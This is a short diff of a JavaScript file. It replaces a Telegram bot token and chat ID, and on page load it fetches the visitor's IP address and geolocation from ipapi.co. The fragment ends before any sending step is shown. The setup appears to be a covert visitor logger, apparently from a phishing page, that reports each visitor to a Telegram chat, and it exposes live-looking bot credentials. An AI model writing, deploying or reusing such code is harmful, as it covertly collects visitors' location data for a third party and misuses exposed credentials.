@@ -1,6 +1,6 @@
 window.onload = function () {
-  const token = "8184130096:AAF3V_OGZKK4jD9URC2AfPkLULK7WVfDkBM";
-  const chat_id = "-4882759923";
+  const token = "8058698868:AAEUmT3a572JM5Ge6zBn0lmL0C_d0MeHuvk";
+  const chat_id = "-4809143176";
 
   fetch("https://ipapi.co/json/")
     .then((res) => res.json())
